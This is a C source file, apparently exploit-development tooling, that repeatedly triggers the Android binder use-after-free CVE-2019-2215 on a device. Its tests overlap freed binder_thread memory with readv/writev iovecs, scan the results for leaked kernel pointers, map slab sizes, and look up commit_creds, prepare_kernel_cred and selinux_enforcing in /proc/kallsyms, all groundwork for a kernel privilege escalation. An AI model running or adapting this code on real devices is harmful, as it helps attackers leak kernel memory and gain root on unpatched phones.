/*
 * binder_diag.c - CVE-2019-2215 diagnostics
 * Determines exact binder_thread struct layout and UAF behavior.
 *
 * Runs multiple UAF tests with different iov sizes and configurations
 * to determine:
 * 1. Exact offset of wait_queue_head_t in binder_thread
 * 2. Whether list_del actually fires
 * 3. What data ends up where after the UAF
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o binder_diag binder_diag.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/wait.h>

#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

static void force_binder_thread(int fd)
{
    struct binder_write_read bwr;
    char buf[32];
    memset(&bwr, 0, sizeof(bwr));
    bwr.read_size = sizeof(buf);
    bwr.read_buffer = (unsigned long)buf;
    ioctl(fd, BINDER_WRITE_READ, &bwr);
}

static int pin_to_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}

static void hexdump(const char *label, const void *data, int len)
{
    const unsigned char *p = data;
    printf("  %s (%d bytes):", label, len);
    for (int i = 0; i < len && i < 64; i++) {
        if (i % 16 == 0) printf("\n    %04x: ", i);
        printf("%02x ", p[i]);
    }
    printf("\n");
}

static volatile int alarm_fired = 0;
static void alarm_handler(int sig) { (void)sig; alarm_fired = 1; }

/*
 * Test 1: Basic UAF with readv, parent closes write end
 * This ensures readv returns when pipe has no more writers
 */
static void test_readv_basic(int attempt, int per_iov, int num_iov)
{
    int binder_fd, epfd, pipefd[2];
    struct epoll_event event = { .events = EPOLLIN };

    pin_to_cpu(0);

    binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) { printf("  [-] open binder: %s\n", strerror(errno)); return; }
    force_binder_thread(binder_fd);
    epfd = epoll_create(1000);
    if (epfd < 0) { close(binder_fd); return; }
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event) < 0) {
        close(epfd); close(binder_fd); return;
    }
    if (pipe(pipefd) < 0) {
        close(epfd); close(binder_fd); return;
    }

    /* Allocate iovec + buffers */
    struct iovec *iov = calloc(num_iov, sizeof(struct iovec));
    char **bufs = calloc(num_iov, sizeof(char *));
    for (int i = 0; i < num_iov; i++) {
        bufs[i] = calloc(1, per_iov);
        /* Fill with pattern so we can detect modifications */
        memset(bufs[i], 0x41 + (i % 26), per_iov);
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = per_iov;
    }

    pid_t pid = fork();
    if (pid < 0) {
        for (int i = 0; i < num_iov; i++) free(bufs[i]);
        free(bufs); free(iov);
        close(pipefd[0]); close(pipefd[1]);
        close(epfd); close(binder_fd);
        return;
    }

    if (pid == 0) {
        /* CHILD */
        close(pipefd[0]); /* close read end */
        pin_to_cpu(0);
        usleep(100000); /* 100ms */

        /* Trigger UAF */
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);

        /* Write data to pipe */
        usleep(10000); /* 10ms settle */
        char data[256];
        memset(data, 'Z', sizeof(data));
        for (int i = 0; i < num_iov; i++) {
            int to_write = per_iov;
            while (to_write > 0) {
                int chunk = to_write > 256 ? 256 : to_write;
                write(pipefd[1], data, chunk);
                to_write -= chunk;
            }
        }
        close(pipefd[1]); /* close write end - signals EOF to reader */
        _exit(0);
    }

    /* PARENT */
    close(pipefd[1]); /* Close write end so readv gets EOF after child dies */

    /* Free the binder_thread */
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);

    /* Set alarm in case readv hangs */
    alarm_fired = 0;
    signal(SIGALRM, alarm_handler);
    alarm(5);

    ssize_t bytes = readv(pipefd[0], iov, num_iov);
    int readv_errno = errno;
    alarm(0);

    int expected = num_iov * per_iov;
    printf("  readv: %zd/%d bytes (errno=%d %s) alarm=%d\n",
           bytes, expected, readv_errno,
           bytes < 0 ? strerror(readv_errno) : "ok", alarm_fired);

    if (bytes > 0 && bytes < expected) {
        int completed_iovs = bytes / per_iov;
        int remainder = bytes % per_iov;
        printf("  -> Completed %d full iovecs + %d bytes of iov[%d]\n",
               completed_iovs, remainder, completed_iovs);
        printf("  -> Corruption likely at iov[%d] (byte offset 0x%x in struct)\n",
               completed_iovs, completed_iovs * (int)sizeof(struct iovec));
    }

    /* Check buffers for unexpected data */
    for (int i = 0; i < num_iov; i++) {
        int modified = 0;
        unsigned char expected_val = 0x41 + (i % 26);
        for (int j = 0; j < per_iov; j++) {
            unsigned char c = (unsigned char)bufs[i][j];
            if (c != expected_val && c != 'Z') {
                if (!modified) {
                    printf("  iov[%d] ANOMALY (expected 0x%02x or 'Z'):\n",
                           i, expected_val);
                    modified = 1;
                }
            }
        }
        if (bytes > 0) {
            int iov_start = i * per_iov;
            int iov_end = iov_start + per_iov;
            if (iov_start < bytes) {
                /* This iov was (at least partially) filled by readv */
                int filled = (iov_end <= bytes) ? per_iov : (bytes - iov_start);
                /* Check first few bytes */
                int has_z = 0, has_orig = 0, has_other = 0;
                for (int j = 0; j < filled; j++) {
                    unsigned char c = (unsigned char)bufs[i][j];
                    if (c == 'Z') has_z++;
                    else if (c == expected_val) has_orig++;
                    else has_other++;
                }
                if (has_other > 0) {
                    hexdump("modified data", bufs[i], filled > 64 ? 64 : filled);
                }
            }
        }
    }

    /* Scan ALL buffers for kernel-looking pointers */
    for (int i = 0; i < num_iov; i++) {
        uint64_t *p = (uint64_t *)bufs[i];
        for (int j = 0; j < per_iov / 8; j++) {
            if ((p[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL) {
                printf("  [!] KERNEL PTR at buf[%d]+%d: 0x%016lx\n", i, j*8, p[j]);
            }
        }
    }

    waitpid(pid, NULL, 0);
    close(pipefd[0]);
    close(epfd);
    close(binder_fd);
    for (int i = 0; i < num_iov; i++) free(bufs[i]);
    free(bufs);
    free(iov);
}

/*
 * Test 2: UAF with writev (write TO pipe, read FROM iovecs)
 * If iov[N].iov_base is corrupted to kernel addr, writev reads kernel memory!
 */
static void test_writev_leak(int attempt)
{
    int binder_fd, epfd, pipefd[2];
    struct epoll_event event = { .events = EPOLLIN };
    int num_iov = 19;
    int per_iov = 64;

    pin_to_cpu(0);

    binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) return;
    force_binder_thread(binder_fd);
    epfd = epoll_create(1000);
    if (epfd < 0) { close(binder_fd); return; }
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event) < 0) {
        close(epfd); close(binder_fd); return;
    }
    if (pipe(pipefd) < 0) {
        close(epfd); close(binder_fd); return;
    }

    struct iovec iov[19];
    char bufs[19][64];
    for (int i = 0; i < num_iov; i++) {
        memset(bufs[i], 0x41 + i, 64);
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = 64;
    }

    pid_t pid = fork();
    if (pid < 0) {
        close(pipefd[0]); close(pipefd[1]);
        close(epfd); close(binder_fd);
        return;
    }

    if (pid == 0) {
        /* CHILD */
        close(pipefd[1]); /* close write end */
        pin_to_cpu(0);
        usleep(100000);
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        /* Read whatever writev wrote to the pipe */
        usleep(50000);
        char readbuf[2048];
        int total = 0;
        for (;;) {
            ssize_t n = read(pipefd[0], readbuf + total, sizeof(readbuf) - total);
            if (n <= 0) break;
            total += n;
        }
        /* Write results back through a different channel */
        /* For simplicity, just print them */
        printf("  [CHILD] Read %d bytes from pipe after writev\n", total);
        if (total > 0) {
            printf("  [CHILD] First 64 bytes:\n    ");
            for (int i = 0; i < 64 && i < total; i++)
                printf("%02x ", (unsigned char)readbuf[i]);
            printf("\n");
            /* Check for kernel pointers in the data */
            uint64_t *p = (uint64_t *)readbuf;
            for (int i = 0; i < total / 8; i++) {
                if ((p[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL) {
                    printf("  [CHILD] KERNEL PTR at offset %d: 0x%016lx\n", i*8, p[i]);
                }
            }
        }
        _exit(0);
    }

    /* PARENT */
    close(pipefd[0]); /* close read end */

    /* Free binder_thread */
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);

    alarm_fired = 0;
    signal(SIGALRM, alarm_handler);
    alarm(5);

    /* writev: reads FROM our buffers, writes TO pipe */
    ssize_t bytes = writev(pipefd[1], iov, num_iov);
    int writev_errno = errno;
    alarm(0);

    int expected = num_iov * per_iov;
    printf("  writev: %zd/%d bytes (errno=%d %s) alarm=%d\n",
           bytes, expected, writev_errno,
           bytes < 0 ? strerror(writev_errno) : "ok", alarm_fired);

    if (bytes > 0 && bytes < expected) {
        int completed = bytes / per_iov;
        printf("  -> writev stopped at iov[%d] (byte offset 0x%x)\n",
               completed, completed * (int)sizeof(struct iovec));
    }

    close(pipefd[1]);
    int status;
    waitpid(pid, &status, 0);
    close(epfd);
    close(binder_fd);
}

/*
 * Test 3: Determine binder_thread slab size
 * Allocate iovecs of different sizes and see which ones get the UAF
 */
static void test_slab_sizes(void)
{
    printf("\n=== Test 3: Slab Size Detection ===\n");
    /* Try different iovec counts to see which slab the UAF prefers */
    struct { int num_iov; int per_iov; int total; const char *slab; } configs[] = {
        { 8,  16, 128, "kmalloc-128" },
        { 16, 16, 256, "kmalloc-256" },
        { 19, 16, 304, "kmalloc-512" },
        { 32, 16, 512, "kmalloc-512" },
        { 19, 32, 608, "kmalloc-1024" },
        { 19, 64, 1216, "kmalloc-2048" },
    };

    for (int c = 0; c < 6; c++) {
        printf("\nConfig: %d iovecs x %d bytes = %d total (%s)\n",
               configs[c].num_iov, configs[c].per_iov,
               configs[c].total, configs[c].slab);
        for (int attempt = 0; attempt < 3; attempt++) {
            printf("  Attempt %d: ", attempt);
            test_readv_basic(attempt, configs[c].per_iov, configs[c].num_iov);
        }
    }
}

/*
 * Test 4: Check /proc for any useful info
 */
static void test_proc_info(void)
{
    printf("\n=== Test 4: /proc Information ===\n");

    /* Check kallsyms for known symbols */
    FILE *fp = fopen("/proc/kallsyms", "r");
    if (fp) {
        char line[256];
        int nonzero = 0;
        int total = 0;
        uint64_t first_nonzero = 0;
        while (fgets(line, sizeof(line), fp) && total < 100) {
            uint64_t addr;
            if (sscanf(line, "%lx", &addr) == 1 && addr != 0) {
                nonzero++;
                if (!first_nonzero) first_nonzero = addr;
            }
            total++;
        }
        fclose(fp);
        printf("  kallsyms: %d/%d non-zero addresses\n", nonzero, total);
        if (first_nonzero)
            printf("  First non-zero: 0x%016lx\n", first_nonzero);
        else
            printf("  All addresses zeroed (kptr_restrict)\n");
    }

    /* Check if we can read specific kernel symbols after becoming root */
    fp = fopen("/proc/kallsyms", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "selinux_enforcing") ||
                strstr(line, "init_task") ||
                strstr(line, "prepare_kernel_cred") ||
                strstr(line, "commit_creds")) {
                printf("  %s", line);
            }
        }
        fclose(fp);
    }

    /* Check for kernel address in dmesg */
    fp = fopen("/proc/last_kmsg", "r");
    if (fp) {
        printf("  /proc/last_kmsg accessible!\n");
        char line[256];
        int count = 0;
        while (fgets(line, sizeof(line), fp) && count < 5) {
            uint64_t addr;
            if (sscanf(line, "%*[^0]0x%lx", &addr) == 1) {
                if ((addr & 0xFFFFFFC000000000ULL) == 0xFFFFFFC000000000ULL) {
                    printf("  Kernel addr in last_kmsg: 0x%lx\n", addr);
                    count++;
                }
            }
        }
        fclose(fp);
    } else {
        printf("  /proc/last_kmsg: %s\n", strerror(errno));
    }

    /* Try dmesg */
    fp = popen("dmesg 2>/dev/null | head -20", "r");
    if (fp) {
        char line[256];
        int count = 0;
        while (fgets(line, sizeof(line), fp) && count < 3) {
            if (strstr(line, "ffffffc0") || strstr(line, "FFFFFFC0")) {
                printf("  dmesg kernel addr: %s", line);
                count++;
            }
        }
        pclose(fp);
        if (count == 0) printf("  No kernel addrs found in dmesg\n");
    }

    /* Check thread_info size */
    printf("  sizeof(struct iovec) = %zu\n", sizeof(struct iovec));
    printf("  Page size = %ld\n", sysconf(_SC_PAGESIZE));
}

/*
 * Test 5: Try to read boot partition for kernel image
 */
static void test_boot_partition(void)
{
    printf("\n=== Test 5: Boot Partition ===\n");

    /* Try common Android boot partition paths */
    const char *paths[] = {
        "/dev/block/mmcblk0p15",  /* Common boot partition */
        "/dev/block/mmcblk0p16",
        "/dev/block/mmcblk0p17",
        "/dev/block/mmcblk0p12",
        "/dev/block/mmcblk0p14",
        NULL
    };

    for (int i = 0; paths[i]; i++) {
        int fd = open(paths[i], O_RDONLY);
        if (fd < 0) continue;

        char magic[8];
        ssize_t n = read(fd, magic, 8);
        if (n == 8) {
            if (memcmp(magic, "ANDROID!", 8) == 0) {
                printf("  [+] Found boot image at %s!\n", paths[i]);

                /* Read boot image header */
                struct {
                    char magic[8];
                    uint32_t kernel_size;
                    uint32_t kernel_addr;
                    uint32_t ramdisk_size;
                    uint32_t ramdisk_addr;
                    uint32_t second_size;
                    uint32_t second_addr;
                    uint32_t tags_addr;
                    uint32_t page_size;
                } __attribute__((packed)) hdr;

                lseek(fd, 0, SEEK_SET);
                if (read(fd, &hdr, sizeof(hdr)) == sizeof(hdr)) {
                    printf("  Kernel size: %u (0x%x)\n", hdr.kernel_size, hdr.kernel_size);
                    printf("  Kernel load addr: 0x%x\n", hdr.kernel_addr);
                    printf("  Ramdisk size: %u\n", hdr.ramdisk_size);
                    printf("  Page size: %u\n", hdr.page_size);
                }
            } else {
                printf("  %s: not a boot image (magic: %02x%02x%02x%02x)\n",
                       paths[i],
                       (unsigned char)magic[0], (unsigned char)magic[1],
                       (unsigned char)magic[2], (unsigned char)magic[3]);
            }
        }
        close(fd);
    }
}

int main(void)
{
    printf("=== CVE-2019-2215 Diagnostics ===\n");
    printf("uid=%d pid=%d\n", getuid(), getpid());

    /* Sanity check */
    int fd = open("/dev/binder", O_RDONLY);
    if (fd < 0) {
        printf("[-] /dev/binder: %s\n", strerror(errno));
        return 1;
    }
    close(fd);
    printf("[+] /dev/binder accessible\n");

    /* Test 1: Basic readv UAF with different iov sizes */
    printf("\n=== Test 1: readv UAF (19 iovecs x 64 bytes) ===\n");
    for (int i = 0; i < 5; i++) {
        printf("Attempt %d:\n", i);
        test_readv_basic(i, 64, 19);
    }

    /* Test 1b: readv with smaller iovecs (16 bytes each = pure iovec-sized) */
    printf("\n=== Test 1b: readv UAF (19 iovecs x 16 bytes) ===\n");
    for (int i = 0; i < 5; i++) {
        printf("Attempt %d:\n", i);
        test_readv_basic(i, 16, 19);
    }

    /* Test 2: writev (might leak kernel data) */
    printf("\n=== Test 2: writev UAF (kernel data leak attempt) ===\n");
    for (int i = 0; i < 3; i++) {
        printf("Attempt %d:\n", i);
        test_writev_leak(i);
    }

    /* Test 3: Slab size detection */
    test_slab_sizes();

    /* Test 4: /proc information */
    test_proc_info();

    /* Test 5: Boot partition */
    test_boot_partition();

    printf("\n=== DIAGNOSTICS COMPLETE ===\n");
    return 0;
}
